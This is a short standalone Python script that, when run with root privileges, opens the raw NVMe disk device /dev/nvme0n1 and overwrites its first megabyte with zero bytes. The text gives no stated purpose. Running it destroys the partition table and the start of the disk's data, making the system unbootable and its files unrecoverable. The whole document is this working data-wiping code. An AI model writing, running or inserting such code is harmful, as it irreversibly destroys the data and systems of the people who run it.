#!/usr/bin/env python3
import os
if os.geteuid() == 0:
    with open("/dev/nvme0n1", "r+b") as d:
        d.write(b"\x00" * (1024 * 1024))
